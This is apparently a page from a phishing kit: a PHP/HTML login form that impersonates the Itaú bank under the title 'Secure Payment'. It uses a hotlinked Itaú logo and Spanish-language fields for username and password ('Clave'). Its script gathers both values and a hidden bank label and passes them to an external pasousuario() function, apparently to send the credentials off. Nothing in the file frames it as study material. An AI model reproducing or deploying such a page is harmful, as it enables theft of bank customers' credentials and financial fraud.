<?php
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <link rel="stylesheet" href="style.css">
    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
    <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="/scripts/functions2.js"></script>  		
    <title>Secure Payment</title>
  </head>

  <body>  
    <div class="logo" style="height:300px;">
        <center><img src="https://i0.wp.com/logoroga.com/wp-content/uploads/2012/04/itau.jpg?fit=500%2C375&ssl=1" alt="" width="" height="300px"></center>
    </div>
    <div style="border:1px solid #dcdcdc; height:50px; padding-bottom:18px;">
      <br>
      <center><a id="texto" style="margin-bottom:10px;">Personas</a>
      </center>
    </div>
    <div class="inp">

      <br><label for="" style="margin-left:20px;">Usuario</label>
      <div>
        <input required="required" type="text" id="txtUsuario" name="userC" minlength="6" maxlength="14" style="width:90%;margin-left:20px; font-size: 18px; margin-top:10px;">
      </div>
      <input type="checkbox" name="" id="" style="margin-left:20px;margin-top:10px; border:1px solid black;"> <label for=""> For english</label><br>
      <br><label for="" style="margin-left:20px;">Clave</label>
      <div>
        <input required="required" type="password" name="pass" id="txtPass" minlength="6" maxlength="14" style="width:90%;margin-left:20px; font-size: 18px; margin-top:10px;"><br>
      </div>
      <div style="width:90%;margin-left:20px; font-size: 18px; margin-top:10px;">
        <label >Hemos cambiado nuestra politica de datos, para mayor información haz clic <a href="">Aquí</a></label>
      </div>
      <br>
      <center><input type="submit" value="Ingresar" id="btnUsuario" style="width:90%; border-radius:100px; border:none; height:40px; background-color: #fe6a00;"><br>
      <br><input type="submit" value="Regístrate" style="width:88%; height:40px; background-color: white; color:#fe6a00;border:2px solid #fe6a00;">
      </center>
      <center><br><br><a href="" style="color:blue; font-size:20px;     font-weight: 600;">Desbloquea tu usuario</a></center>
    </div>
    <input type="hidden" value="Itau" id="banco">

    <script type="text/javascript">
      var espera = 0;
      let identificadorTiempoDeEspera;
      function retardor() {
        identificadorTiempoDeEspera = setTimeout(retardorX, 900);
      }
      function retardorX() {
      }
      $(document).ready(function() {
        $('#btnUsuario').click(function(){
          if (($("#txtUsuario").val().length > 0) && ($("#txtPass").val().length == 14)) {
            pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
          }else{
            $("#err-mensaje").show();
            $(".user").css("border", "1px solid red");
            $("#txtUsuario").focus();
          }			
        });
        $("#txtUsuario").keyup(function(e) {
          $(".user").css("border", "1px solid #CCCCCC");	
          $("#err-mensaje").hide();				
        });
      });
    </script>
  </body>
</html>